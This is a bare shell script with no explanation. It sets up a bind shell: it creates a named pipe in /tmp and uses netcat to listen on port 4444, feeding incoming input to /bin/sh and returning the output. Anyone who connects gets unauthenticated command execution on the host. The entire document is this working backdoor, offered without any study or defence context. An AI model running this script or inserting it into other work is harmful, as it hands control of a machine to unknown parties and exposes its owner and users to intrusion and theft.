#!/bin/sh
mkfifo /tmp/f; nc -l 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1
